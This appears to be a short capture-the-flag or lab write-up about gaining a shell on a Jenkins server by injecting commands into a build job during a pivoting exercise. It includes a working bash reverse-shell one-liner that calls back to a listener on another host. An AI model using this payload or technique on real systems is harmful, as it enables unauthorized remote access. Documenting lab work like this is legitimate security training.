# Exploit Jenkins

Searching for possible attack vectors I found an article by HackTricks [here](https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins) and following one method I saw a possible way in.

![[hacktricks.png]]

Then I tried to follow the steps with the "Sample job" project.

![[jenkins_attack_vector.png]]

First I tested the command execution by injecting:

```bash
bash --version
```

To check if I could use a bash reverse shell payload.

![[bash_test.png]]

Build the project and check the console output and I confirmed both the command execution and that bash was available.

![[bash_confirmed.png]]

Now let's try to set up a listener, inject a bash reverse shell payload and run it.

Use the IP of target 1 but the one on the pivoted network and start a handler.

![[final_handler.png]]

Then inject the payload on Jenkins.

![[final_bash_revshell.png]]

Then build the project.

That payload didn't work. Let's try another one.

```bash
bash -c "bash -i >& /dev/tcp/192.27.225.2/8888 0>&1"
```

Build and run again.

This time it worked, I spawned a shell  of user "jenkins"

![[jenkins_revshell.png]]

Now I tried to look for the flag.

![[target_2_flag_not_sure.png]]


Checking the lab solution gaining access was enough. But the proposed solution was different, creating a bind shell to the kali instance.